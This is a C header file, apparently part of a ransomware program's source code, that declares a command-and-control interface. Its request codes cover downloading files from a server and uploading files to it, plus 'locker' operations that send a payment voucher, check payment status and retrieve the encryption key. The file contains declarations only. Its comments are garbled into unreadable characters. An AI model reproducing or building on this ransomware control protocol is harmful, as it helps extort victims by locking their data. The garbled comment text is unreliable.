#ifndef __POSSESSOR_CONTROLLER_H_
#define __POSSESSOR_CONTROLLER_H_

#define REQUEST_COMMON 0x94d27aa4 // �������� ������, ����� �� ������� ������ ����� ����������� � ����������� �� ������������ ������� (�. �. �� �����).
#define SERVER_CHECK_FILE 1 // ������ HEAD �� ��������� ���������� � ����� �� �������.
#define SERVER_DOWNLOAD_FILE 2 // ���������� ����� � �������.
#define SERVER_SEND_FILE 3 // �������� ������/����� �� ������.
#define REQUEST_CHECK_INTERNET 10 // �������� ������� ���������.
#define SERVER_LOCKER_SEND_VOUCHER 20 // �������� ���� ������� �� ������.
#define SERVER_LOCKER_CHECK_STATUS 21 // ������ ������� �������.
#define SERVER_LOCKER_GET_CRYPT_KEY 22 // ������ ����� ����������.

typedef void(__stdcall *FnCtrlResponseCallback)(void* data, uint32_t dataSize);

typedef struct _ctrl_request
{
    int requestType;
    httpclient_t httpClient;
} ctrl_request_t;

LPSTREAM __stdcall ctrl_init_stream(uint32_t requestType);

// server side
void __stdcall ctrl_init_network_pipe(void);

// client side
void __stdcall ctrl_do_request(LPSTREAM pStream, FnCtrlResponseCallback fnCtrlResponseCallback);

#endif // __POSSESSOR_CONTROLLER_H_
